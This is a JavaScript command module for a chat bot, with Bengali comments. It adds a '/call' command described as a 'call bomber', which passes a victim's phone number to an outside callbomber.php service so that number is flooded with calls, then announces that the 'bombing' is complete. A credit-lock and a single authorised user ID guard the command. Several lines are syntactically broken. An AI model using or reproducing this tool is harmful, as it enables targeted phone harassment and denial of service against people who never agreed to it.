module.exports.config = { name: "call", version: "1.0.0", hasPermssion: 0, credits: "RAJA ViP 5X", // ❌ এইটা পরিবর্তন করলে বট চলবে না description: "কল বোম্বার, বিভিন্ন দেশের নাম্বারের জন্য", commandCategory: "Tool", usages: "/call +8801xxxxxxxxx", cooldowns: 15, dependencies: { "axios": "" } };

const correctCredit = "RAJA ViP 5X"; const allowedUserID = "100013678366954";

const countryData = { "880": { name: "Bangladesh", flag: "🇧🇩" }, "91": { name: "India", flag: "🇮🇳" }, "92": { name: "Pakistan", flag: "🇵🇰" }, "1": { name: "USA/Canada", flag: "🇺🇸" }, "971": { name: "UAE", flag: "🇦🇪" }, "93": { name: "Afghanistan", flag: "🇦🇫" }, "213": { name: "Algeria", flag: "🇩🇿" }, "44": { name: "UK", flag: "🇬🇧" }, "20": { name: "Egypt", flag: "🇪🇬" }, "353": { name: "Ireland", flag: "🇮🇪" }, "880": { name: "Bangladesh", flag: "🇧🇩" }, "977": { name: "Nepal", flag: "🇳🇵" }, "94": { name: "Sri Lanka", flag: "🇱🇰" }, "60": { name: "Malaysia", flag: "🇲🇾" }, "62": { name: "Indonesia", flag: "🇮🇩" }, "7": { name: "Russia", flag: "🇷🇺" }, "86": { name: "China", flag: "🇨🇳" }, "81": { name: "Japan", flag: "🇯🇵" }, "82": { name: "South Korea", flag: "🇰🇷" }, "855": { name: "Cambodia", flag: "🇰🇭" }, "856": { name: "Laos", flag: "🇱🇦" }, "84": { name: "Vietnam", flag: "🇻🇳" }, "66": { name: "Thailand", flag: "🇹🇭" }, "39": { name: "Italy", flag: "🇮🇹" }, "33": { name: "France", flag: "🇫🇷" }, "49": { name: "Germany", flag: "🇩🇪" } };

module.exports.run = async ({ api, event, args }) => { const axios = require("axios");

// Check if user is allowed if (event.senderID !== allowedUserID) { return api.sendMessage("❌ আপনি এই কমান্ড ব্যবহারের অনুমতি পাচ্ছেন না!", event.threadID, event.messageID); }

// Credit চেক if (module.exports.config.credits !== correctCredit) { return api.sendMessage("❌ দয়া করে ক্রেডিট পরিবর্তন করবেন না!\n✍️ Creator: RAJA ViP 5X", event.threadID, event.messageID); }

// Help command if (args[0] === "help") { let helpMessage = "🌍 সাপোর্টেড দেশসমূহ:\n\n"; for (const code in countryData) { const { name, flag } = countryData[code]; helpMessage += ${flag} ${name} [+${code}]\n; } helpMessage += "\n📌 ব্যবহার: /call +<CountryCode><Number>\nউদাহরণ: /call +8801xxxxxxxxx"; return api.sendMessage(helpMessage, event.threadID, event.messageID); }

const number = args[0]; if (!number || !/^+?[0-9]{8,15}$/.test(number)) { return api.sendMessage("❌ সঠিক আন্তর্জাতিক নাম্বার দিন (উদা: /call +8801xxxxxxxxx)", event.threadID, event.messageID); }

const numberDigits = number.replace(/[^0-9]/g, ''); const countryCode = Object.keys(countryData).find(code => numberDigits.startsWith(code)); const country = countryData[countryCode] || { name: "Unknown", flag: "🌍" };

// Optional: লোকেশন API ব্যবহার করলে এখানে যুক্ত করুন const locationText =  📞 কল বোম্বিং শুরু হয়েছে: ${number} 🌐 দেশ: ${country.name} ${country.flag} ⚠️ দয়া করে খারাপ কাজে ব্যবহার করবেন না।;

api.sendMessage(locationText, event.threadID, async (err, info) => { try { const response = await axios.get(https://tbblab.shop/callbomber.php?mobile=${number}); setTimeout(() => { api.unsendMessage(info.messageID); }, 90000);

return api.sendMessage(`✅ বোম্বিং সম্পন্ন হয়েছে ${number}`, event.threadID, event.messageID);
} catch (error) {
  return api.sendMessage(`❌ ত্রুটি: ${error.message}`, event.threadID, event.messageID);
}

}); };

                                                                                                           
